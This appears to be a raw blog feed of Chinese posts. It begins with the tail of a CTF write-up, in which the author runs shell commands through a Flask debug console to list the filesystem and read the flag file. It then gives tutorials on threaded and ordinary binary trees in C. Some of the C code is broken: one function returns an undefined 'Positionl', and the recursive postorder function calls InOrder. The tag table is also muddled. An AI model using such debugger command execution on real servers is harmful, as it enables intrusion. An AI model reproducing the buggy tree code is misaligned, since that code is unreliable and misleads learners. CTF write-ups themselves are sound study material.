class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;app.py\nstatic\ntemplates\nuploads\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;Fffff111114444gggggg\napp\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmed  </span></span><br><span class="line"><span class="string">&gt;&gt;&gt; os.popen(&#x27;</span>cat /Fffff111114444gggggg<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">&#x27;</span>XSCTF&#123;oh_mY_d2bug93r_M0de_!&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>得到flag<code>XSCTF&#123;oh_mY_d2bug93r_M0de_!&#125;</code>。</p><h2 id="后话"><a class="markdownIt-Anchor" href="#后话"></a> 后话</h2><p>当时在线下赛时，被这个flask算PIN折磨的几乎崩溃，没有吃透源码被博客坑惨了。而且出题人也玩了一手阴招，并没有按照Python版本的规律出题。导致我思路全对却因为一直采用的是md5加密而无法计算出正确的PIN值。</p><p>其实这题很简单，只要有Flask的debug模式+任意文件读取就可以做。</p><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><p><a href="https://blog.hz2016.com/2023/07/flask%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8Fpin%E5%80%BC%E8%AE%A1%E7%AE%97%E5%92%8C%E5%88%A9%E7%94%A8/">Flask调试模式PIN值计算和利用 - 正汰的学习笔记 (hz2016.com)</a></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg" alt="300342" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF苦痛之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 目录穿越 </tag>
            
            <tag> 任意读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（五）——树：线索二叉树</title>
      <link href="/posts/e69cb496aa79/"/>
      <url>/posts/e69cb496aa79/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构什锦四"><a class="markdownIt-Anchor" href="#数据结构什锦四"></a> 数据结构什锦（四）</h1><h2 id="线索二叉树"><a class="markdownIt-Anchor" href="#线索二叉树"></a> 线索二叉树</h2><p>在先前的笔记中，我们讨论了普通的二叉树。但是普通二叉树的非递归遍历依赖于栈和队列的辅助，而这两者占用的空间过大。且在普通二叉树的大部分指针为空指针。例如，一棵有n个节点的二叉树就包含n+1个空指针，会造成储存空间的浪费。</p><p>现在我们来介绍线索二叉树/threaded binary tree traversal，这种二叉树的遍历不需要栈或者队列，而是在空指针中储存一些信息称为线索/thread来辅助遍历。</p><h3 id="线索二叉树的动机"><a class="markdownIt-Anchor" href="#线索二叉树的动机"></a> 线索二叉树的动机</h3><p>容易知道，我们之所以在之前需要用栈或者队列去储存节点，是因为我们需要在遍历完该节点左子树后再遍历其右子树。如果我们把这些信息储存在空指针里，就不需要栈和队列了。那么我们要怎么储存信息呢？</p><p>通常我们会储存节点的前驱/后继节点。如果我们处理的是<strong>先序遍历</strong>，那么对于给定的节点，它的左空指针存放该节点的<strong>先序</strong>前驱节点信息，右空指针储存该节点的<strong>先序</strong>后继节点的信息。</p><h3 id="线索二叉树的分类"><a class="markdownIt-Anchor" href="#线索二叉树的分类"></a> 线索二叉树的分类</h3><p>我们将是否在左右指针中均存有有用信息还是只在其中一个空指针中存储信息来将线索二叉树进行分类。</p><ul><li>左线索二叉树/left threaded binary tree。只在左空指针中存储前驱节点信息。</li><li>右线索二叉树/right threaded binary tree。只在右空指针中存储后继节点信息。</li><li>满线索二叉树/full threaded binary tree。两个空指针域中都储存信息。</li></ul><p>下面我们默认只讨论满线索二叉树。</p><h3 id="线索二叉树的类型"><a class="markdownIt-Anchor" href="#线索二叉树的类型"></a> 线索二叉树的类型</h3><p>基于上面的讨论，我们还能给出线索二叉树的三种表示。</p><ul><li>先序线索二叉树/preorder threaded binary tree。左右空指针域分别储存先序遍历序列中前驱/后继节点的信息。</li><li>中序线索二叉树/inorder threaded binary tree。左右空指针域分别储存中序遍历序列中前驱/后继节点的信息。</li><li>后序线索二叉树/postorder threaded binary tree。左右空指针域分别储存后序遍历序列中前驱/后继节点的信息。</li></ul><p>这三种看起来都差不多，所以接下来我们只讨论中序线索二叉树来展开讨论。</p><h3 id="线索二叉树的结构"><a class="markdownIt-Anchor" href="#线索二叉树的结构"></a> 线索二叉树的结构</h3><p>线索二叉树必须要区分清楚线索和常规左右指针，所以我们添加了两个辅助域。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="type">int</span> LTag;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="type">int</span> RTag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>具体的信息整理了如下表格。</p><table><thead><tr><th></th><th>常规二叉树</th><th>线索二叉树</th></tr></thead><tbody><tr><td>如果LTag==0</td><td>空</td><td>指向中序序列前驱节点的左线索</td></tr><tr><td>如果LTag==1</td><td>指向左孩子的指针</td><td>指向中序序列后继节点的左线索</td></tr><tr><td>如果RTag==0</td><td>空</td><td>指向中序序列前驱节点的右线索</td></tr><tr><td>如果RTag==1</td><td>指向右孩子的指针</td><td>指向中序序列后继节点的右线索</td></tr></tbody></table><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))3((3))--&gt;6((6))3((3))--&gt;7((7))4((4)).-&gt;8((NULL))4((4)).-&gt;2((2))2((2)).-&gt;1((1))6((6)).-&gt;3((3))6((6)).-&gt;1((1))7((7)).-&gt;3((3))7((7)).-&gt;9((NULL))  </pre></div><p>我们可以注意到线索二叉树的最左边和最右边两个节点的空指针是悬挂的，那么他们指向哪里呢？</p><p>为了方便，我们定义一个特殊节点Dummy。该节点总是存在，即使对于一个空的树他也存在。且Dummy节点的右标识为1，其右孩子节点指向它自己。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span> <span class="title">Dummy</span>=</span>&#123;</span><br><span class="line">    &amp;Dummy,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">-1</span>,<span class="comment">//任何不存在的值</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    &amp;Dummy</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB    left --- LTag:1    left --&gt; 1    LTag:1 --- None    None --- RTag:1    RTag:1 --- right    right .-&gt; right1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))3((3))--&gt;6((6))3((3))--&gt;7((7))4((4)).-&gt;left4((4)).-&gt;2((2))2((2)).-&gt;1((1))6((6)).-&gt;3((3))6((6)).-&gt;1((1))7((7)).-&gt;3((3))7((7)).-&gt;right  </pre></div><h3 id="线索二叉树的操作"><a class="markdownIt-Anchor" href="#线索二叉树的操作"></a> 线索二叉树的操作</h3><h4 id="在中序遍历中查找中序后继节点"><a class="markdownIt-Anchor" href="#在中序遍历中查找中序后继节点"></a> 在中序遍历中查找中序后继节点</h4><p>假设我们给定的节点是P，要查询该节点的后继节点。如果P没有又子树，就返回P的右孩子指针，此时该指针指向的元素即为后继节点；倘若P存在右子树，就返回指向其右子树最左下的节点的指针。（主要是由于这是中序遍历，先遍历左子树再读取节点。此时该节点右子树的最左下节点是该节点的后继节点）</p><p>代码实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> ThreadedBinaryTreeNode*<span class="title function_">InorderSuccessor</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*P)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">Position</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(P-&gt;RTag==<span class="number">0</span>)<span class="comment">//判断是否存在右子树</span></span><br><span class="line">        <span class="keyword">return</span> P-&gt;right;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Position=P-&gt;right;</span><br><span class="line">        <span class="keyword">while</span> (Position-&gt;LTag==<span class="number">1</span>)<span class="comment">//遍历至节点右子树最左边的元素</span></span><br><span class="line">            Position=Position-&gt;left;</span><br><span class="line">        <span class="keyword">return</span> Positionl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于中序线索二叉树的中序遍历"><a class="markdownIt-Anchor" href="#基于中序线索二叉树的中序遍历"></a> 基于中序线索二叉树的中序遍历</h4><p>我们可以从Dummy节点开始调用<code>InorderSuccessor()</code>来访问每个节点直到回到Dummy节点为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InorderTraversal</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="comment">//root即为Dummy节点，此时调用InorderSuccessor函数传入Dummy节点</span></span><br><span class="line">    <span class="comment">//判断Dummy节点的右子树是否存在，Dummy节点的右子树始终存在且指向自己</span></span><br><span class="line">    <span class="comment">//于是这里返回的是Dummy节点右子树最左侧的节点，也就是其自身的左子树的最左侧节点</span></span><br><span class="line">    <span class="comment">//然后沿着树一路北上知道从另一侧重新回到Dummy节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">P</span>=</span> root;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        P= InorderSuccessor(P);</span><br><span class="line">        <span class="keyword">if</span>(P==root)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,P-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在中序遍历中查找先序后继节点"><a class="markdownIt-Anchor" href="#在中序遍历中查找先序后继节点"></a> 在中序遍历中查找先序后继节点</h4><p>策略和查找中序后继节点的方法类似。首先检查给定节点的左子树：若存在左子树，则返回P的左孩子指针；否则，返回右子树包含P的最近节点的右孩子。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> ThreadedBinaryTreeNode*<span class="title function_">PreorderSuccessor</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*P)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">Position</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(P-&gt;LTag==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> P-&gt;left;<span class="comment">//如果左子树存在，返回指向的左孩子。</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Position=P;</span><br><span class="line">        <span class="keyword">while</span> (Position-&gt;RTag==<span class="number">0</span>)<span class="comment">//一直遍历到该节点的右子树最右端</span></span><br><span class="line">            Position=Position-&gt;right;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> Position-&gt;right;<span class="comment">//此时返回的是右子树的最右端节点后继节点，当然，按照的是中序规则。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于中序线索二叉树的先序遍历"><a class="markdownIt-Anchor" href="#基于中序线索二叉树的先序遍历"></a> 基于中序线索二叉树的先序遍历</h4><p>和中序遍历一样，从Dummy节点开始调用<code>PreorderSuccessor()</code>遍历每个节点直到回到Dummy节点为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreorderTraversal</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">P</span>=</span>root;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        P= PreorderSuccessor(P);</span><br><span class="line">        <span class="keyword">if</span>(P==root)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,P-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><p>（暂时先写这么多，浅浅了解一下就好……应该吧）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2086464994_p0.jpg" alt="复件 86464994_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线索二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（四）——树：二叉树</title>
      <link href="/posts/8e4d523d90ab/"/>
      <url>/posts/8e4d523d90ab/</url>
      
        <content type="html"><![CDATA[<p>这次我们来聊聊树，重点讨论了二叉树的性质。</p><hr /><h2 id="什么是树"><a class="markdownIt-Anchor" href="#什么是树"></a> 什么是树</h2><p>树是一种类似于链表的数据结构。但是不同于链表、栈、队列等线性结构，树是我们接触到的第一个非线性数据结构。它的每个节点指向的是一批节点，而不是单个节点，也就是一对多的关系。树结构可以用来表示图范畴中具有层次特性的结构。</p><p>在树的ADT中，元素之间的次序不再被强调。如果需要表示有序的信息，考虑采用链表等线性储存结构。</p><h2 id="相关术语"><a class="markdownIt-Anchor" href="#相关术语"></a> 相关术语</h2><ul><li><strong>树的根/root</strong>，指没有双亲的节点。一棵树中至多有一个根节点。</li><li><strong>边/edge</strong>，表示的是从双亲到孩子的链接。</li><li><strong>叶子节点/leaf</strong>，没有孩子的节点。</li><li><strong>兄弟节点/sibling</strong>，相同双亲的孩子节点称为兄弟sibling。</li><li><strong>祖先节点/ancestor</strong>，如果存在一条从根节点到节点p的一条路径，且节点q在这条路径上，那么q是p的一个祖先，节点p是q的一个子孙/descendant。</li><li><strong>层/level</strong>，在指定深度的所有节点的集合称为树的层。根节点所在的层是<strong>第1层</strong>。（但是《数据结构与算法 经典问题解析》上认为根节点所在层是第0层）</li><li><strong>节点的深度/depth</strong>，是指根节点到该节点的路径长度。</li><li><strong>节点的高度/height</strong>，指该节点到最深节点的路径长度。</li><li><strong>树的深度</strong>，所有节点深度的最大值。</li><li><strong>树的高度</strong>，所有节点高度的最大值。树的高度和深度相等，但节点不一定。</li><li><strong>节点的度</strong>，节点拥有子树的个数称为节点的度。</li><li><strong>树的度</strong>，树中各节点度的最大值。一般我们将树的度为m的树称为<strong>m次树</strong>或者<strong>m叉树</strong>。</li><li><strong>节点的大小/size</strong>，是指包括该节点在内的以及它子孙节点的个数。</li><li><strong>斜树/skew tree</strong>，如果一棵树除了叶子节点外每一个节点都只有一个孩子节点，就称这棵树为斜树。如果全部是左孩子节点就是左斜树/left skew tree，如果全部是右孩子节点就是右斜树/right skew tree。</li><li><strong>森林</strong>，几棵不相关的树的集合称为森林。</li></ul><h2 id="树的性质"><a class="markdownIt-Anchor" href="#树的性质"></a> 树的性质</h2><ol><li>树中所有的节点数等于所有节点的度数加一。</li><li>定义总节点数为n，n<sub>i</sub>为度数为i的节点，则n=n<sub>0</sub>+n<sub>1</sub>+n<sub>2</sub>+…+n<sub>m</sub>。m为树的度。</li><li>度为m的树中第i层上至多有m<sup>i-1</sup>个节点（i≥1）。比如度为3的树第二层至多有3个节点。</li><li>高度为h的m次数至多有m<sup>h</sup>-1/m-1个节点（就是等比数列求和公式）<code>Sn=a1(1-q^n)/(1-q)（q≠1)</code>。</li></ol><h2 id="二叉树"><a class="markdownIt-Anchor" href="#二叉树"></a> 二叉树</h2><p>如果树的度为2，我们就成称这棵树为二叉树。空树也是一棵合法的二叉树，我们将二叉树看做是由两棵互不相交的子树构成，分别称为左子树和右子树。</p><h3 id="特殊的二叉树"><a class="markdownIt-Anchor" href="#特殊的二叉树"></a> 特殊的二叉树</h3><h4 id="严格二叉树strict-binary-tree"><a class="markdownIt-Anchor" href="#严格二叉树strict-binary-tree"></a> 严格二叉树/strict binary tree</h4><p>一棵树中每个节点要么有两个孩子要么没有孩子，就是严格二叉树。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((4))1((1))--&gt;3((3))2((4))--&gt;4((2))2((4))--&gt;5((5))  </pre></div><h4 id="满二叉树full-binary-free"><a class="markdownIt-Anchor" href="#满二叉树full-binary-free"></a> 满二叉树/full binary free</h4><p>如果一棵树中每个非叶子节点都刚好有两个孩子且所有叶子节点都处于同一层，就是满二叉树，同时也满足严格二叉树的定义。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))3((3))--&gt;6((6))3((3))--&gt;7((7))  </pre></div><h4 id="完全二叉树complete-binary-tree"><a class="markdownIt-Anchor" href="#完全二叉树complete-binary-tree"></a> 完全二叉树/complete binary tree</h4><p>我们先假设一棵树的高度为h，然后从根节点开始依次对节点进行编号（令根节点编号为1）。那么我们可以得到一个从1到n的完全序列（n为树的节点数）。在编号遇到空指针时，我们也应该给空指针进行编号（也就是没有孩子节点的节点）。</p><p>如果一棵二叉树的所有叶子节点的<strong>高度</strong>是h或h-1，并且得到的节点编号序列中没有遗漏任何一个数（即保证编号是一个完全序列），那么这棵二叉树是一个完全二叉树。其特点是叶子节点只可能在最下层和次下层出现，且最下层的叶子节点集中在树的左部。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))  </pre></div><h3 id="二叉树的性质"><a class="markdownIt-Anchor" href="#二叉树的性质"></a> 二叉树的性质</h3><p>假设二叉树的高度为h，定义根节点的高度为0。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))3((3))--&gt;6((6))3((3))--&gt;7((7))  </pre></div><p>可以推断出以下性质：</p><ul><li>满二叉树的节点个数n为2<sup>h+1</sup>-1。这是因为高度为h的满二叉树共有h+1层。而每一层均充满节点，因此n=2<sup>0</sup>+2<sup>1</sup>+2<sup>2</sup>+…+2<sup>h</sup>=2<sup>h+1</sup>-1。</li><li>完全二叉树的节点个数介于最小值2<sup>h</sup>和最大值2<sup>h+1</sup>-1之间。</li><li>满二叉树的叶子节点个数为2<sup>h</sup>。</li><li>具有n个节点的完全二叉树中有n+1个空链接（被浪费掉的指针）。</li></ul><h3 id="二叉树的结构"><a class="markdownIt-Anchor" href="#二叉树的结构"></a> 二叉树的结构</h3><p>为了简单起见，我们假设二叉树所携带的数据类型为整形。一种表达二叉树的方法是，每个节点包括一个数据域与两个指针域，分别指向左孩子和右孩子。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的操作"><a class="markdownIt-Anchor" href="#二叉树的操作"></a> 二叉树的操作</h3><h4 id="主要操作"><a class="markdownIt-Anchor" href="#主要操作"></a> 主要操作</h4><ul><li>将一个元素插入到二叉树中</li><li>在二叉树中删除一个元素</li><li>在二叉树中搜索某个元素</li><li>遍历二叉树</li></ul><h4 id="辅助操作"><a class="markdownIt-Anchor" href="#辅助操作"></a> 辅助操作</h4><ul><li>求二叉树的大小</li><li>求二叉树的高度</li><li>求拥有节点数最多的层次</li><li>求给定的一对节点或更多节点的最早共同祖先/Least Common Ancestor，LCA</li></ul><h3 id="二叉树的应用"><a class="markdownIt-Anchor" href="#二叉树的应用"></a> 二叉树的应用</h3><ul><li>在编译器中用的表达树/expression tree</li><li>在数据压缩算法中的赫夫曼编码数/Huffman coding tree</li><li>二叉搜索树/Binary Search Tree，BST。可以实现在很多元素中以平均情况下O(log<sub>n</sub>)的时间开销进行排序。</li><li>优先队列/Priority Queue，PQ。利用PQ可实现在很多元素中最坏情况下以对数时间开销去找出和删除其中的最小值/最大值。</li></ul><h3 id="二叉树的遍历"><a class="markdownIt-Anchor" href="#二叉树的遍历"></a> 二叉树的遍历</h3><p>在链表等线性数据结构中，我们可以比较容易的实现对每一个元素的访问，但是在树结构中，访问元素存在着多种顺序。</p><p>树的遍历与树的搜索很像，因为后者的实现也依赖于前者遍历访问树的每一个元素。但是遍历是以特定的顺序在树中移动，此外，在树的遍历中所有节点都会被访问到；而在树的搜索中，搜索过程将在找到目标节点后终止。</p><h4 id="可能的遍历方案"><a class="markdownIt-Anchor" href="#可能的遍历方案"></a> 可能的遍历方案</h4><p>树的遍历从根节点开始，在每一个节点都有三个操作步骤，分别用三个字母表示就是：L（遍历左子树）、R（遍历右子树）、D（访问当前节点）。二叉树的遍历很容易用基于这种表示的递归方式来描述，在这种定义下有六种方法：LRD、LDR、DLR、DRL、RDL、RLD。</p><p>其实相对于节点来说，先搜索左边还是右边无关紧要，所以将搜索方法精简为三种：</p><ul><li>先序（DLR）遍历</li><li>中序（LDR）遍历</li><li>后序（LRD）遍历</li><li>层次遍历，灵感来自于图的广度优先搜索算法（BFS），是另外一种遍历方式。</li></ul><p>以下图为例开启后续的讨论。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))3((3))--&gt;6((6))3((3))--&gt;7((7))  </pre></div><h5 id="先序遍历"><a class="markdownIt-Anchor" href="#先序遍历"></a> 先序遍历</h5><p>先序遍历分为三步：</p><ul><li>访问根节点</li><li>遍历左子树</li><li>遍历右子树</li></ul><p>如此得到的节点访问顺序是：1,2,4,5,3,6,7。</p><p>用递归来实现先序遍历很简单。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">        PreOrder(root-&gt;left);</span><br><span class="line">        PreOrder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不采用递归结构，也可以实现。因为在访问该节点元素之后还要遍历其左右子树，我们需要保存其左右子树的信息之后再去遍历其他树。我们采用栈结构来实现这一点，因为栈结构的LIFO结构特性使得在逆序中可以得到返回的右子树信息。在访问其左子树前，现将该节点压入栈中，然后访问完左子树之后将节点从栈中弹出继续遍历其右子树。重复上述过程直到栈为空。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PreOrderNonRecursive(<span class="keyword">struct</span> BinaryTreeNode*root) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>*<span class="title">S</span>=</span>CreateStack();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> (root)&#123;</span><br><span class="line">            <span class="comment">//处理当前节点</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">            Push(&amp;S,root);</span><br><span class="line">            <span class="comment">//如果左子树存在，就将其压入栈</span></span><br><span class="line">            root=root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(IsEmptyStack(S))&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//表示当前节点，左子树处理完毕，下面开始处理右子树</span></span><br><span class="line">        root= Pop(&amp;S);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteStack(&amp;S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="中序遍历"><a class="markdownIt-Anchor" href="#中序遍历"></a> 中序遍历</h5><p>在中序遍历中，根节点是在左右子树遍历之间进行访问的。中序遍历定义如下：</p><ul><li>遍历左子树</li><li>访问根节点</li><li>遍历右子树</li></ul><p>如此操作得到的访问顺序是：4,2,5,1,6,3,7。</p><p>递归实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        InOrder(root-&gt;left);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">        InOrder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//和前面的思路基本一样</span></span><br></pre></td></tr></table></figure><p>中序遍历的非递归算法和先序遍历的实现非常相似，唯一的区别就是访问元素的时间发生在了元素出栈时，这时意味着元素的左子树已经处理完毕，实现代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">InOrderNonRecursive(<span class="keyword">struct</span> BinaryTreeNode*root) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>*<span class="title">S</span>=</span>CreateStack();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> (root)&#123;</span><br><span class="line">            Push(&amp;S,root);</span><br><span class="line">            <span class="comment">//访问左子树，并继续将左子树的根压入栈中</span></span><br><span class="line">            root=root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(IsEmptyStack(S))&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        root= Pop(&amp;S);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);<span class="comment">//出栈后，处理当前节点</span></span><br><span class="line">        <span class="comment">//表示左子树，当前节点均处理完毕，现在开始处理右子树。</span></span><br><span class="line">    &#125;</span><br><span class="line">    DeleteStack(&amp;S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="后序遍历"><a class="markdownIt-Anchor" href="#后序遍历"></a> 后序遍历</h5><p>后续遍历定义如下：</p><ul><li>遍历左子树</li><li>遍历右子树</li><li>访问根节点</li></ul><p>得到的访问序列为：4,5,2,6,7,3,1。</p><p>递归实现思路一样，代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        InOrder(root-&gt;left);</span><br><span class="line">        InOrder(root-&gt;right);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//和前面的思路基本一样</span></span><br></pre></td></tr></table></figure><p>后序遍历采用非递归实现则比较复杂，因为每个节点会被访问两次：在遍历左节点时我们会访问该节点，遍历右节点时会访问该节点。当第二次访问结束时，我们才能处理该节点，那么问题来了，当我们返回到该节点时我们要怎么判断是通过遍历完左子树访问的还是遍历完右子树访问到的呢？</p><p>我们不妨定义一个previous节点和一个current节点，前者用来储存上一个访问的节点，后者则假设是当前的栈顶节点。</p><p>当previous节点是current的parent节点时，我们判断current节点是否存在左子树。如果存在，则继续遍历左子树（即将current的左孩子压入栈）；如果不存在，则判断是否存在右子树；如果不存在右孩子（即为叶子节点），弹出该节点进行处理。</p><p>当previous节点是current的左孩子节点时，说明我们是从处理完左子树返回的该节点。检查该节点是否有右孩子：如果有，则继续遍历右孩子（将右孩子压入栈），否则弹出该数据。</p><p>当previous节点是current的右孩子节点时，说明我们是从处理完右子树返回的该节点，此时可以直接弹出该元素进行处理。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrderNonRecursive</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> *<span class="title">S</span>=</span>CreateStack();</span><br><span class="line">    Push(&amp;S,root);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 